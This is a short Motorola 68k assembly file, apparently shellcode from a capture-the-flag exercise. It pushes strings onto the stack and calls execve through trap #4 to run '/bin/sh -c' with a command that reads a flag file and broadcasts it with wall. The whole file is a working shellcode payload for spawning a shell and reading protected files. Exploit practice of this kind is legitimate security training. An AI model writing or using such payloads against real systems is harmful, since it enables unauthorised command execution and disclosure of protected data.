
	.text
.globl _main	
_main:

	// need to move stack up so that it doesn't overlap
	addw #1000, sp

	// execve("/bin/sh", ["/bin/sh", "-c", "wall < /me/flag"], NULL)
	eorl d3, d3
	movel d3,sp@-

	// n/sh
	movel #0x6e2f7368,sp@-

	// //bi
	movel #0x2f2f6269,sp@-
	
	// d1 has @"//bin/sh"
	movel sp, d1

	// put "-c" onto the stack
	// 0x2d630000Â ^ 0x41414141 = 0x6c224141
	// movel #0x6c224141,d4
	// eorl #0x41414141,d4
	// movel d4,sp@-
	movel d3,sp@-
	movew #0x2d63,sp@-
	movel sp, d5

	// d5 now has @"-c"

	// push "wall</me/flag ;wall</me/flag" onto stack
	movel d3,sp@-
	// flag
	movel #0x666c6167,sp@-
	// /me/
	movel #0x2f6d652f,sp@-
	// "all<"
	movel #0x616c6c3c,sp@-
	// "g ;w"
	movel #0x67203b77,sp@-
	// "/fla"
	movel #0x2f666c61,sp@-	
	// "</me"
	movel #0x3c2f6d65,sp@-		
	// "wall"
	movel #0x77616c6c,sp@-			
	
	movel sp, d4
	// d4 now has &"/wall <  /me/flag"
	movel d3,sp@-
	movel d4,sp@-
	movel d5,sp@-
	movel d1,sp@-
	
	// d2 has argv
	movel sp, d2
	
	movel #59, d0
	trap #4



	
